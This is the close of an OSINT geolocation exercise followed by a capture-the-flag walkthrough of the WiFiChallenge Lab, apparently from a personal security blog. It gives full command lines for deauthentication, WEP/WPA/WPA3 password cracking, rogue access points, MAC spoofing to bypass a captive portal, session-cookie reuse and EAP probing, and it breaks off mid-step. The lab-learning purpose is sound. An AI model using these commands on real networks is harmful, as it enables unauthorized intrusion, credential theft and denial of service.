two buildings Arts Centre Melbourne of height 162 metres and IBM Australia of height 131 metres, however we could not conclude our search there as there is a building that is lacking form our street view, we could therefore play with the time frames from google earth to see the structure when it was available at the time of the picture being taken.\nAfter a few minutes of adjusting the time frame to the year 2012, I got a building structure that was not available at our street view as of 2025 as shown below.\nAs shown below are the structures that were on the image during the capture.\nzooming closer, we are able to find the name of the building as shown below.\nsearching it on google maps as central equity Melbourne as the area is in Melbourne Australia we get this apartment.\nLooking at the street view, it is located behind the two buildings we had identified earlier on the image as shown below and it is indeed the structure that was missing on our earlier street view.\nSearching the height of the building it is 167 metres or 545 ft high as indicated here.\nTherefore comparing the heights of the three buildings\nFOCUS Apartments by Central Equity of height 167 metres Arts Centre Melbourne of height 162 metres IBM Australia of height 131 metres we find that the tallest structure is FOCUS Apartments by Central Equity with a height of 167 metres.\nAnswer FOCUS Apartments by Central Equity of height 167 metres\n","date":"1 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-2/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 2)","type":"posts"},{"content":"","date":"6 January 2025","externalUrl":null,"permalink":"/categories/network-security/","section":"Categories","summary":"","title":"Network Security","type":"categories"},{"content":"","date":"6 January 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"6 January 2025","externalUrl":null,"permalink":"/tags/wifi/","section":"Tags","summary":"","title":"WIFI","type":"tags"},{"content":"\rIntroduction #\rIn this lab, we shall be doing wifi hacking from the WifiChallenge Lab v2.1. We shall start by downloading the virtual machine from the proton drive provided to us from the site, here you can find the virtual machine as per the hypervisor you prefer to use.\n00. What is the contents of the file /root/flag.txt on the VM? #\rfor the first session, after downloading the virtual machine and setting it up, we are given a pair of credentials for the user which is user as well. After logging in to the system we can get our flag in the root directory as per the hint given.\nWith that, we now have our first flag as shown below.\nRECON #\r01. What is the channel that the wifi-global Access Point is currently using? #\rAs per the question asked, we need to put our network card in network mode in order to use it for reconnaissance. For this section we shall use airmon-ng to put our network card in monitor mode and airodump-ng for capturing network traffic and scanning all the channels for it to be easier to identify the wfi-global .\nWe shall use the wlan0 for monitoring.\nLet us put the card into monitor mode using the syntax as shown in the documentation page but first we shall check running processes using the syntax sudo airmon-ng check as shown below.\nwe can kill them and put our interface into monitor mode using the command sudo airmon-ng check kill\nwith that, we can now enable our interface into monitor mode using the command `sudo airmon-ng start wlan0\nAfter we have enabled our interface for monitoring we can then start capturing the network traffic as we scan through for our asked wifi’s channel using airodump-ng, as shown below.\nsudo airodump-ng wlan0mon -w ~/VICTOR/captures --manufacturer --wps --band abg\nwhere -w tells where we shall output our traffic, --manufacturer is used to Display manufacturer from IEEE OUI list, --wps is used to display wps information and —band abg is used to display Band on which airodump-ng should hop as shown in the documentation.\nwe can now see our channel clearly.\n02. What is the MAC of the wifi-IT client? #\rHere we shall use airodump-ng and specify the channel of the wifi in order to get more detials of the wifi using the command sudo airodump-ng wlan0mon -w ~/VICTOR/captures --manufacturer --wps --band abg --channel \u0026lt;channel number\u0026gt;\n03. What is the probe of 78:C1:A7:BF:72:46 #\rTo get the probe for the specified we shall use airodum-ng to scan the network again using the command we used first that is sudo airodump-ng wlan0mon -w ~/VICTOR/captures --manufacturer --wps --band abg and get the probe as shown below.\n04. What is the ESSID of the hidden AP (mac F0:9F:C2:6A:88:26)? #\rFor this section, we shall use the mdk4 tool to perform a brute force to launch probes with each of the ESSID until the AP responds, however we shall need to modify our wordlist by embedding the word wifi- before the words as the other APs are named.\ncat ~/rockyou-top100000.txt | awk '{print \u0026quot;wifi-\u0026quot; $1}' \u0026gt; /home/user/VICTOR/captures/pass.txt\nFirst we shall capture the traffic using the command we used before in order for us to identify the channel to which the AP is on to use it to set for us to capture the traffic to perform a brute force attack on it to get the AP name using the commands shown below.\niwconfig wlan0mon channel \u0026lt;channel number\u0026gt; the iwconfig is used to display and change the parameters of the network interface which are specific to the wireless operation, in this case we are setting the channel to that of the hidden AP.\nAfterwards we shall then brute force the captured traffic using mdk4 as shown mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f pass.txt.\nmdk4 :\nThe name of the tool being run. MDK4 is commonly used for Wi-Fi testing and comes with several testing modes.\nwlan0mon :\nThe network interface in monitor mode (important for injecting packets and performing wireless attacks). Replace wlan0mon with your interface name if it\u0026rsquo;s different.\np :\nThis specifies the Probe Request Flood mode in MDK4. This mode sends a flood of probe requests, which can simulate many devices searching for networks, potentially overloading the target AP or causing disruptions.\nt F0:9F:C2:6A:88:26 :\nThe t option specifies the target\u0026rsquo;s MAC address . In this case, the target MAC address is F0:9F:C2:6A:88:26.\nf pass.txt :\nThe f option provides a file containing SSIDs (network names) or other parameters to use during the attack.\nIn this case, the file pass.txt likely contains SSIDs that will be included in the probe requests to target the specific access point.\nOPN #\r05. What is the flag in the hidden AP router behind default credentials? #\rAfter we got our ESSID, we shall now try to connect to the network using wpa_supplicant,(utility for managing wireless network connections in Linux) from the terminal after creating a config file that will enable us to connect to the wifi, the contents of the file will be as shown below.\nnetwork={ ssid=\u0026#34;$ESSID\u0026#34; key_mgmt=NONE scan_ssid=1 } The above details mean the following.\nnetwork={} :\nThis block defines a specific Wi-Fi network configuration. ssid=\u0026quot;$ESSID\u0026quot; :\nssid specifies the name of the Wi-Fi network to connect to. If you use $ESSID, it implies that $ESSID is a variable (e.g., set in your environment or script). Note : wpa_supplicant does not directly interpret variables in the configuration file. You would need to preprocess the file or replace $ESSID with the actual network name (e.g., ssid=\u0026quot;MyNetwork\u0026quot;). key_mgmt=NONE :\nkey_mgmt=NONE specifies that no key management is required for this network. This typically indicates an open network (e.g., one without WPA/WPA2 encryption). scan_ssid=1 :\nscan_ssid=1 tells wpa_supplicant to actively scan for the specified SSID. This is useful for hidden networks (networks that don\u0026rsquo;t broadcast their SSID). after we have created our file, we shall now try to connect to our wifi using wpa_supplicant using the syntax wpa_supplicant -Dnl80211 -iwlan2 -c free.conf and on another terminal we shall try to get an IP address from the connected wifi network using the dhclient using the command dhclient wlan2 -v as root user .\nThe command wpa_supplicant -Dnl80211 -iwlan2 -c free.conf means as follows\nwpa_supplicant : This is the command-line tool for connecting to Wi-Fi networks. It\u0026rsquo;s used to handle the WPA/WPA2 authentication process. Dnl80211 : The D option specifies the driver back-end to be used. nl80211 is the modern driver interface for communicating with kernel-based Wi-Fi drivers, typically used in most Linux distributions. Other options might include wext (deprecated) or hardware-specific back-ends. iwlan2 : The i option specifies the interface name of the Wi-Fi network card you want to connect with. In this case, the interface is wlan2. Replace this with your actual wireless interface (e.g., wlan0 or wlan1) if necessary. c free.conf : The c option specifies the configuration file to use. free.conf is the configuration file that contains the necessary details for connecting to the desired wireless network. This file typically includes: The SSID (network name). The security protocols (e.g., WPA2, PSK). The pre-shared key or passphrase for the network. The command dhclient wlan2 -v means\ndhclient : This is the DHCP client program on Linux systems. It requests network configuration parameters (like an IP address, subnet mask, gateway, DNS servers) from a DHCP server on the network. wlan2 : The name of the network interface for which the DHCP request is being made. In this case, it is the wlan2 interface (likely a wireless network adapter). v : Enables verbose mode , which provides detailed output about the process, such as: Sending the DHCP request. Responses received from the DHCP server. Lease details (e.g., assigned IP, lease time, etc.). Any errors encountered during the process. The image above shows the wpa_supplicant running.\nHere we have received an IP address from the network as 192.168.16.84\nOnce connected to the wifi network we can access the web portal from 192.168.16.1 and try to login as an admin user using some default credentials as admin/admin as most people tend to leave their default creds as they are.\nAfter logging in using the creds we found, we now have our flag.\n06. What is the flag on the AP router of the wifi-guest network? #\rFor this challenge we shall begin by scanning the wifi-guest using airodump-ng as we did in the first challenge of recon in order to identify the channel on to which it is running on then try to access the admin page as we did in the previous task.\nIt is running on channel 6, we can now try and capture traffic going through channel 6 alone then create a .conf file that will allow us to connect to the wifi network, the config file will contain the name of the ESSID of the wifi and set key_mgmt=NONE as shown below.\nnetwork={ ssid=\u0026#34;wifi-guest\u0026#34; key_mgmt=NONE } As seen below we have successfully acquired an IP address from the wifi network and we are able to access the web page but it seems we have a captive portal that we are required to bypass.\nFor us to bypass this portal, we will have to clone one of the MAC addresses connected to the wifi as shown below we have one.\nB0:72:BF:44:B0:49\nwe shall first stop the network manager then set the wlan2 interface down then change to the mac address we saw earlier using the commands below and retry again to connect to the wifi network as earlier.\nsystemctl stop network-manager ip link set wlan2 down macchanger -m b0:72:bf:44:b0:49 wlan2 ip link set wlan2 up we have now bypassed the portal as shown below.\nI tried some default creds but they did not work, however, I decided to capture traffic using airodump-ng on the channel and go through it to see f there are any credentials that I can find on the capture file.\nas shown above after capturing our traffic using the command airodump-ng wlan0mon --manufacturer --wps -c6 -w /home/user/VICTOR/captures/OPN/ we can now go through our traffic and be able to get the password by going through the traffic using wireshark then get our credentials for logging in to the web page as admin.\nand we have our flag.\nWEP #\r07. What is the flag on the wifi-old AP website? #\rThis challenge was quite easy as we can get the cahnnel and BSSID of the wifi using airodump-ng and try get the key using besside-ng as shown below.\nThen we can use besside-ng to get the key, as this tool does the heavy work automatically and gets the password for us, we shall use the syntax besside-ng -c 3 -b F0:9F:C2:71:22:11 wlan2 -v .\nbesside-ng : The main tool being run. It automates the process of: Scanning for networks. Associating with access points. Capturing WPA/WPA2 handshakes. Cracking WEP-encrypted networks. c 3 : The c option specifies the Wi-Fi channel to focus on. In this case, it restricts the tool to operate on channel 3 , rather than scanning all available channels. b F0:9F:C2:71:22:11 : The b option specifies the MAC address of the target access point (AP) . This ensures that besside-ng only targets the specific AP with MAC address F0:9F:C2:71:22:11. wlan2 : The wireless interface to be used for the attack. This interface must support monitor mode and packet injection. Ensure wlan2 is already in monitor mode (e.g., using airmon-ng start wlan2). v : Enables verbose mode , which provides detailed output during execution. Useful for monitoring the tool’s progress and troubleshooting any issues. We now have the key as shown below for the wifi network.\nNow as WEP has a weaker security for wifi, we can use the key to create a .conf file as the intial challenge and connect to the network using wpa_supplicant and get our IP address using dhclient on another terminal as we run it as root user, the contents of the .conf file shall be.\nnetwork={ ssid=\u0026#34;wifi-old\u0026#34; key_mgmt=NONE wep_key0=$PASSWORD wep_tx_keyidx=0 } The contents of the file mean as explained below.\nnetwork={} : Defines a specific Wi-Fi network to connect to. Each network block contains settings for a single network. ssid=\u0026quot;wifi-old\u0026quot; : Specifies the SSID (network name) of the Wi-Fi network you want to connect to. In this case, the network name is wifi-old . key_mgmt=NONE : Specifies the key management protocol . NONE indicates there is no WPA or WPA2 encryption . This is common for WEP networks or open networks. Instead of WPA or WPA2, the network uses the outdated WEP encryption . wep_key0=$PASSWORD : Defines the WEP key (password) for the network. The key is expected to be supplied in this placeholder $PASSWORD. However: wpa_supplicant does not resolve variables directly in the configuration file, so you need to replace $PASSWORD with the actual WEP key (e.g., wep_key0=12345). The key can be specified as: A hexadecimal string (e.g., wep_key0=6162636465). A quoted ASCII string (e.g., wep_key0=\u0026quot;abcde\u0026quot;). wep_tx_keyidx=0 : Specifies which WEP key index to use for transmission. WEP supports multiple keys (up to 4, indexed from 0 to 3). wep_tx_keyidx=0 means the first key (wep_key0) will be used for encrypting outgoing packets. as seen above we have successfully connected to the wifi network and now we can try and access the webpage at 192.168.1.1\nwe have our flag now.\nPSK #\r08. What is the wifi-mobile AP password? #\rThis challenge we have to find the password for the PSK wifi network, here we shall monitor the traffic using airodump-ng and wait for a client to connect or to force a deauth attack with aireplay-ng but first we have to identify the channel of the wifi network.\nIt is channel 6, we can now capture traffic on the channel as we perform a deauth attack on another terminal using aireplay-ng to get a handshake that we can use to get the password for the wifi.\nThe commands we shall use in parallel are as follows.\naireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon\naireplay-ng :\nThis is the tool being executed. It is used to inject packets into a wireless network for various purposes (e.g., deauthentication, fake authentication, ARP request replay). 0 :\nSpecifies a deauthentication attack mode . The tool sends deauthentication packets to disconnect clients from the target network. 10 :\nIndicates the number of deauthentication packets to send. In this case, 10 deauthentication packets will be sent. You can specify 0 to send packets continuously until manually stopped. a F0:9F:C2:71:22:12 :\nSpecifies the MAC address of the target access point (AP) . In this case, the deauthentication packets will be directed at the AP with MAC address F0:9F:C2:71:22:10 . wlan0mon :\nSpecifies the wireless interface in monitor mode . The interface (wlan0mon) must be in monitor mode, which is required to send raw packets. Use airmon-ng start wlan0 to enable monitor mode before running this command airodump-ng wlan0mon -w ~/wifi/scanc6 -c 6 --wps\nas seen above we have performed a deauth attack(an EAPOL traffic indicates that we have captured a successful handshake from the wifi network) using aireplay-ng and we wait a little longer for the airodump-ng to capture some traffic that we can use aircrack-ng to try and get the password using the wordlist top100000.txt.\naircrack-ng -w rockyou-top100000.txt -- '-01.cap'\nwe have our key.\n09. What is the IP of the web server in the wifi-mobile network? #\rFor this challenge we shall use airdecap-ng to decipher our traffic we captured earleir as we now have the key to decipher our traffic then open the deciphered file using wireshark to get the IP of the webserver.\nThe command we shall use to decipher our traffic is as follows.\nairdecap-ng -e wifi-mobile -p $PASSWORD -- '-01.cap'\nairdecap-ng : The tool decrypts WEP, WPA, or WPA2-encrypted packet captures (.cap files) based on the network\u0026rsquo;s encryption key or passphrase. e wifi-mobile : Specifies the ESSID (network name) of the target Wi-Fi network. In this case, the ESSID is wifi-mobile. It helps the tool identify which network\u0026rsquo;s packets to decrypt, especially when multiple networks are present in the capture file. p $PASSWORD : p specifies the password (or passphrase) of the target Wi-Fi network. $PASSWORD is a placeholder variable that stores the actual Wi-Fi passphrase. If the variable contains the correct passphrase, airdecap-ng will use it to decrypt the encrypted packets in the capture file. - : The - signals the end of options. Anything after - is treated as an argument (like file names), even if it starts with a ``. '-01.cap' : The name of the capture file that contains the encrypted packets to decrypt. The file name 01.cap starts with a dash (``), which can confuse tools into interpreting it as a flag. Using - or prefixing the file name with ./ ensures it\u0026rsquo;s treated as a file. we can now open the deciphered traffic and get the IP of the webserver.\nwe have our webserver IP as shown below\n10. what is the flag after login in wifi-mobile? #\rAs seen from the hint given, we are required to use cookies.\nGoing through the decrypted traffic, we saw a cookie from the GET request sent to the web server that we can use to gain the user flag from the website.\nWe shall use wpa_supplicant and dhclient as we did earlier in order to be able to log in to the website.\nThe contents of our configure file shall be as follows.\nnetwork={ ssid=\u0026#34;wifi-mobile\u0026#34; psk=\u0026#34;$PASSWORD\u0026#34; scan_ssid=1 key_mgmt=WPA-PSK proto=WPA2 }PHPSESSID=97qfe2c37hso8725c1p5reft7s network={ ... } : Defines a network block, which contains all the settings required to connect to a specific Wi-Fi network. ssid=\u0026quot;wifi-mobile\u0026quot; : Specifies the SSID (Service Set Identifier) of the Wi-Fi network. In this case, the SSID is wifi-mobile. psk=\u0026quot;$PASSWORD\u0026quot; : Specifies the pre-shared key (PSK) , which is the password for the Wi-Fi network. $PASSWORD is a placeholder variable. Replace it with the actual passphrase (e.g., psk=\u0026quot;mypassword123\u0026quot;). The PSK is used for WPA/WPA2-Personal authentication. scan_ssid=1 : Tells the device to actively scan for the network , even if the SSID is hidden. If the access point does not broadcast its SSID, setting this to 1 enables the client to detect and connect to it. key_mgmt=WPA-PSK : Specifies the key management protocol used by the network. WPA-PSK indicates WPA/WPA2 with a Pre-Shared Key (PSK) for authentication. proto=WPA2 : Specifies the protocol to be used for encryption and authentication. WPA2 is used here, which is a secure protocol based on AES encryption. You could also specify WPA for legacy networks. As shown below, we have successfully been given an IP to the network we can try to access the webpage and edit the cookie to get the flag.\nwe have our flag as shown below.\n11. Is there client isolation in the wifi-mobile network? #\rFor this challenge we shall use arp-scan to scan the network for more hosts though the interface we have connected to the network using the commmand sudo arp-scan -I wlan2 -l\narp-scan :\narp-scan is a tool used to identify all active devices on a local network by sending ARP (Address Resolution Protocol) requests. It works at the data link layer (Layer 2), making it highly effective for discovering devices on the same subnet. I wlan2 :\nI specifies the network interface to use for the scan. In this case, wlan2 is the wireless interface you want to scan with. l :\nl (lowercase \u0026ldquo;L\u0026rdquo;) tells arp-scan to scan the local subnet (determined by the interface\u0026rsquo;s IP address and subnet mask). For example, if the interface wlan2 is on 192.168.1.0/24, it will scan all IPs in that range (from 192.168.1.1 to 192.168.1.254). After scanning the network we fingd the following clients on the network.\nuser@WiFiChallengeLab:~/VICTOR/captures/psk$ sudo arp-scan -I wlan2 -l Interface: wlan2, type: EN10MB, MAC: 02:00:00:00:02:00, IPv4: 192.168.2.84 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.2.1\tf0:9f:c2:71:22:12\tUbiquiti Networks Inc. 192.168.2.7\t28:6c:07:6f:f9:43\tXIAOMI Electronics,CO.,LTD 192.168.2.7\t28:6c:07:6f:f9:44\tXIAOMI Electronics,CO.,LTD (DUP: 2) 192.168.2.8\t28:6c:07:6f:f9:43\tXIAOMI Electronics,CO.,LTD 192.168.2.8\t28:6c:07:6f:f9:44\tXIAOMI Electronics,CO.,LTD (DUP: 2) 5 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.9.7: 256 hosts scanned in 2.225 seconds (115.06 hosts/sec). 5 responded we can try and curl one of the host and see if we can get the flag.\nby curling the host 192.168.2.8 we get the user flag.\n12. What is the wifi-offices password? #\rFor this challenge, imagine you’re trying to connect to a Wi-Fi network called \u0026ldquo;wifi-offices,\u0026rdquo; but it doesn’t show up in the list of available networks. This could mean the network is in a different location or no longer exists. However, there’s still a way to figure out its password. Here’s how:\nWe can create a fake access point (AP) that imitates \u0026ldquo;wifi-offices\u0026rdquo; using a tool like hostapd-mana. When devices nearby try to connect to this fake AP (because they’re still looking for \u0026ldquo;wifi-offices\u0026rdquo;), we can capture their connection attempts, also known as probes. From these, we can capture a handshake, which is like a key exchange between the device and the network. Once we have this handshake, we can run a dictionary attack on it to try and crack the password and see it in plain text.\nThe contents of our config file shall contain the following details.\ninterface=wlan1 driver=nl80211 hw_mode=g channel=1 ssid=wifi-offices mana_wpaout=hostapd.hccapx wpa=2 wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP CCMP wpa_passphrase=12345678 The above file contents means the following\ninterface=wlan1 Specifies the wireless interface to be used for hosting the access point. In this case, the interface is wlan1 . This must be a wireless adapter that supports monitor and AP modes. driver=nl80211 Indicates the driver to be used by hostapd. nl80211 is the standard driver interface used for modern Wi-Fi adapters with Linux. hw_mode=g Defines the Wi-Fi mode for the access point: g : Operates on the 2.4 GHz band, supporting 802.11g (and backward-compatible 802.11b) devices. Other options could include a (5 GHz) or n (802.11n for mixed bands). channel=1 Specifies the Wi-Fi channel to use for the access point. Channel 1 operates on the 2.4 GHz frequency band. The channel you choose can affect performance and interference. ssid=wifi-offices Sets the SSID (Service Set Identifier) for the fake access point. The AP will broadcast itself with the name wifi-offices , imitating a real network. mana_wpaout=hostapd.hccapx Configures the output file for captured WPA/WPA2 handshakes . The captured handshake data will be saved to the file hostapd.hccapx , which can later be used for password cracking (e.g., with tools like Hashcat). wpa=2 Specifies the WPA protocol version to be used: 2 : Configures WPA2 (more secure and commonly used). 1 : Would configure WPA (less secure and outdated). wpa_key_mgmt=WPA-PSK Defines the key management protocol : WPA-PSK : Stands for WPA Pre-Shared Key , the standard for personal Wi-Fi networks where a single password is shared among users. wpa_pairwise=TKIP CCMP Specifies the encryption protocols to be used for securing data: TKIP : Temporal Key Integrity Protocol (older and less secure, for backward compatibility). CCMP : Counter Mode Cipher Block Chaining Message Authentication Code Protocol (stronger encryption based on AES). wpa_passphrase=12345678 Sets the Wi-Fi password (passphrase) for the rogue access point. The password for this network is 12345678 . After writing the file and running it with hostapd-mana we get some hashes that we can crack using hashcat as shown below.\ntrying to crack the hash using mode 2500 it does not work, we can try to change it to mode 2200 and try again\nAfter some research, I found out the hash was supposed to be separated from other unwanted characters using the following syntax.\ncat hostapd.hccapx | awk {\u0026#39;print $3\u0026#39;} \u0026gt; hostapd.22000 Breakdown:\ncat hostapd.hccapx Reads (concatenates) the contents of the file hostapd.hccapx and outputs it. | (Pipe) Passes the output of cat as input to the next command. awk {'print $3'} Uses awk, a text processing tool, to extract the third column ($3) from each line. \u0026gt; hostapd.22000 Redirects the output to a new file named hostapd.22000. We now have our password for the wifi as shown below.\nthe password was easily found by using the syntax below with hashcat hashcat -a 0 -m 22000 hostapd.22000 ~/rockyou-top100000.txt --force\nSAE #\r13. What is the flag on the wifi-management AP website? #\rEven in WPA3 networks, it’s still possible to attempt a brute-force attack to discover the password. A tool called \u0026ldquo;wacker\u0026rdquo; can be used for this purpose. It allows us to repeatedly test different password combinations against the network until the correct one is found.\nHowever, keep in mind that WPA3 includes features like SAE (Simultaneous Authentication of Equals), which makes brute-forcing much more challenging by limiting the speed of attempts and using modern cryptographic techniques. Tools like wacker exploit specific vulnerabilities or rely on scenarios where the WPA3 implementation might not be as secure as intended.\nFirst we will have to get the wifi network bssid number and frequency that we can use together with wacker to get the wifi password then use wpa_supplicant to be able to access the website to get the flag.\nwe now have the BSSID number F0:9F:C2:11:0A:24 we can now use the BSSID to get the password using wacker with the syntax ./wacker.py --wordlist ~/rockyou-top100000.txt --ssid wifi-management --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462\nhere is the breakdown of the command\n./wacker.py This runs the Python script wacker.py, which is likely a custom or specialized tool for Wi-Fi brute-forcing or attack tasks. -wordlist ~/rockyou-top100000.txt Specifies the path to the wordlist containing potential passwords to test. In this case, it uses rockyou-top100000.txt, a popular subset of the rockyou.txt password dictionary file, which contains 100,000 commonly used passwords. -ssid wifi-management Indicates the target SSID (Wi-Fi network name) you are attacking. Here, the network is called wifi-management. -bssid F0:9F:C2:11:0A:24 Specifies the target’s BSSID, which is the unique MAC address of the access point. This ensures the attack focuses on the correct network, even if there are other networks with similar SSIDs nearby. -interface wlan2 Defines the wireless interface (network adapter) that will be used for the attack. In this example, the wireless adapter is wlan2. -freq 2462 Specifies the frequency of the Wi-Fi channel in MHz. 2462 MHz corresponds to channel 11 in the 2.4 GHz band. The tool will tune into this frequency to communicate with the target network. we have our password, we can use it now to create a config file that we can use with wpa_supplicant, the following is the content of the file\nnetwork={ ssid=\u0026#34;wifi-management\u0026#34; psk=\u0026#34;$PASSWORD\u0026#34; key_mgmt=SAE scan_ssid=1 ieee80211w=2 } the file content means as follows\nnetwork={...} This block defines the configuration for a specific Wi-Fi network. Multiple network blocks can exist in a configuration file to manage multiple networks. ssid=\u0026quot;wifi-management\u0026quot; Specifies the SSID (Service Set Identifier) of the Wi-Fi network to connect to. Here, the network name is wifi-management. psk=\u0026quot;$PASSWORD\u0026quot; Indicates the pre-shared key (Wi-Fi password) required to connect to the network. The $PASSWORD placeholder would typically be replaced with the actual password in plaintext or a hashed version (depending on your tool). key_mgmt=SAE Specifies the key management protocol to use for authentication. SAE (Simultaneous Authentication of Equals) is the protocol used in WPA3-Personal networks. It enhances security by preventing offline dictionary attacks and improving password-based authentication. scan_ssid=1 Enables scanning for hidden networks . A hidden SSID will not broadcast its name, so enabling scan_ssid=1 allows the client to actively probe for the specified SSID. ieee80211w=2 Configures Management Frame Protection (MFP) . Values : 0: Disabled (not recommended). 1: Optional. 2: Required (mandatory for WPA3). ieee80211w=2 ensures that MFP is enforced, providing additional protection against deauthentication attacks, which is required for WPA3 networks. We can now access the AP website at 192.168.14.1 as seen below and get our flag.\n14. What is the flag on the wifi-IT AP website? #\rWhen dealing with a network using WPA3-SAE, it’s possible to exploit a weakness if a client is configured to support both WPA2 and WPA3. Here’s how it works: we can trick the client into downgrading its connection to WPA2 by setting up a Rogue Access Point (RogueAP). Once the client connects to our RogueAP, we can capture the WPA2 handshake and later try to crack it.\nTake the example of the wifi-offices network. In this scenario, the access point (AP) supports both SAE (used in WPA3) and PSK (used in WPA2). This suggests that some clients might still accept PSK connections. To confirm this, we can analyze the data captured by tools like airodump-ng , specifically looking at the .csv file it generates. This file provides details about the authentication methods supported by the AP and its clients, helping us determine whether the downgrade attack is feasible.\nWe shall start by identifying the BSSID of the wifi using airodump-ng that we can use later .\nwe have the BSSID as F0:9F:C2:1A:CA:25 ,we can now create a rogue AP but first we shall create our config file with the following contents\ninterface=wlan1 driver=nl80211 hw_mode=g channel=11 ssid=wifi-IT mana_wpaout=hostapd-management.hccapx wpa=2 wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP CCMP wpa_passphrase=12345678 interface=wlan1\nSpecifies the wireless network interface to be used for the access point. Here, it’s wlan1 .\ndriver=nl80211\nSets the driver for the wireless card. nl80211 is the standard Linux driver used for most modern Wi-Fi devices.\nhw_mode=g\nSpecifies the wireless mode. g indicates that the AP will operate on the 2.4 GHz band , supporting 802.11g devices.\nchannel=11\nSpecifies the Wi-Fi channel on which the AP will operate. Channel 11 is a common choice for 2.4 GHz networks.\nssid=wifi-IT\nSets the SSID (Service Set Identifier) of the access point. This is the name of the network that devices will see when scanning for Wi-Fi. Here, the network is named wifi-IT .\nmana_wpaout=hostapd-management.hccapx\nConfigures mana-toolkit to save captured WPA handshake data to a file named hostapd-management.hccapx . This can be used for offline password cracking.\nwpa=2\nSpecifies the security protocol used for the network. 2 indicates WPA2, which is a secure Wi-Fi encryption standard.\nwpa_key_mgmt=WPA-PSK\nSets the key management method. WPA-PSK (Pre-Shared Key) means devices will use a shared password for authentication.\nwpa_pairwise=TKIP CCMP\nConfigures the encryption protocols:\nTKIP (Temporal Key Integrity Protocol): An older encryption method. CCMP (Counter Mode with Cipher Block Chaining Message Authentication Code Protocol): A more secure encryption method based on AES. Modern devices usually prefer CCMP . wpa_passphrase=12345678\nSets the pre-shared key (Wi-Fi password) for the network. In this example, the password is 12345678 . It must be between 8 and 63 characters long.\nBefore we set up our rogue AP lets check if the AP has MFP with wireshark as shown below.\nyou may be wondering why we had to check MFP, let me break it down to you. MFP (Management Frame Protection) is a wireless network feature designed to secure management frames from being tampered with or spoofed. When MFP is set to false (or disabled), the network becomes more vulnerable to certain types of wireless attacks.\nWhen MFP is False: Potential Vulnerabilities\nDeauthentication and Disassociation Attacks Attackers can send spoofed deauthentication or disassociation frames to disconnect clients from the network (e.g., using tools like aireplay-ng ). This is commonly used in Evil Twin attacks or to capture WPA handshakes for password cracking. Rogue Access Points and Evil Twin Attacks An attacker can set up a malicious AP that mimics the real one. Clients may be tricked into connecting to the rogue AP if MFP is not enforcing management frame integrity. Beacon Frame Spoofing Attackers can inject fake beacon frames to confuse clients, leading to denial-of-service (DoS) attacks or manipulation of the network. Channel Switching Attacks Attackers can send forged management frames to force clients to switch to a different channel, disrupting communication. Client Tracking Without MFP, management frames can be captured and analyzed to track connected devices\u0026rsquo; activity, leading to privacy issues. In our case with MFP disabled we can use this opportunity to create a rogue AP and perform a deauth attack in parallel in order to capture the password for the network when a client tries to log in to our rogue AP as shown below.\nWe can now crack the hashes to get the wifi password using hashcat. As we did in the challenge number 12 on PSK category.\nAfter we have our password we shall then create a config file that will allow us to login to the website to get the falg, for this section we can follow the previous challenge on how to use wpa_supplicant and dhclient to get an IP that we can use to access the wifi network for us to be able to access the website.\nRecon MGT #\r15. What is the domain of the users of the wifi-regional network? #\rIn management (MGT) networks, it\u0026rsquo;s possible for misconfigured users to send their identity (username) in plain text before the secure TLS tunnel is established. This can expose sensitive information. Using a tool like airodump-ng , we can passively capture this data without actively interfering with the network.\nHere’s how it works:\nYou simply run airodump-ng on the correct channel of the network and patiently wait for clients to connect. As users attempt to authenticate, their identity information might be visible in the captured packets if the network or client devices are misconfigured. This is a good example of why properly securing WPA2/WPA3 Enterprise networks is so important.\nHowever, we shall start first by identifying the channel of the wifi we are to connect to as shown below.\nIt is on channel 44, we can now try and capture traffic on the channel as we wait for a client to connect to the network. After we capture the traffic, as from the hint, we can use wifi_db to get the captured data from ariodump-ng in an arranged format that we can access from the database\nas shown below.\nThe syntax used for dispalying the data in sqlite is as follows python3 wifi_db.py -d wifi.sqlite /home/user/VICTOR/captures/psk/MGT here is the explanation of the command\npython3 wifi_db.py\nThis indicates that you\u0026rsquo;re running a Python script named wifi_db.py using Python 3. The script likely processes Wi-Fi-related data and interacts with a database.\nd wifi.sqlite\nThe -d option specifies the database file to use.\nwifi.sqlite is an SQLite database file, which is a lightweight, file-based database. The script will likely insert, query, or analyze data within this database. /home/user/VICTOR/captures/psk/MGT\nThis is the directory containing input data (e.g., capture files) for the script to process.\nThe folder /home/user/VICTOR/captures/psk/MGT likely contains capture files related to PSK (Pre-Shared Key) or MGT (Management) Wi-Fi networks. These files might include .cap, .pcap, or other formats used for Wi-Fi packet captures. 16. What is the email address of the servers certificate? #\rWhen establishing a TLS tunnel between an MGT network and a client, the access point (AP) sends its certificate to the client in plain text. This means that anyone monitoring the communication can see the certificate. While this might seem harmless, it can actually provide valuable information. For example, an attacker could use this certificate to create a fake version with the same fields, which can be used in a RogueAP attack. Additionally, the certificate might reveal details like the corporate domain, internal email addresses, or other relevant information about the AP or the organization.\nTo explore these certificates, we can use a tool like pcapFilter.sh, which helps display the certificates used by APs operating with MGT.\nThe syntax to run the script is as follows bash pcapFilter.sh -f '-02.cap' -C here is a breakdown of the command\npcapFilter.sh\nThis is the script being executed. It is a custom or third-party tool designed to process .cap files (packet captures) and filter specific information, such as certificates.\nf '-02.cap'\nThe f option specifies the input file for the script. -02.cap is the packet capture file containing network traffic data. C\nThis option tells the script to filter and display certificates. Certificates are often sent during the handshake process of networks using MGT or enterprise-level WPA protocols (e.g., WPA2-Enterprise). This data can provide insights into APs\u0026rsquo; configurations or help in crafting attacks like RogueAP or MITM.\n17. What is the EAP method supported by the wifi-global AP? #\rWhen testing the security of a network using EAP (Extensible Authentication Protocol), it\u0026rsquo;s important to understand what authentication methods the network\u0026rsquo;s AP (Access Point) supports. Once you\u0026rsquo;ve identified a valid user, you can probe the network by forcing different EAP authentication methods. This is where a tool like EAP_buster becomes valuable.\nbash ./EAP_buster.sh wifi-global 'GLOBAL\\GlobalAdmin' wlan\nbash ./EAP_buster.sh This runs a Bash script named 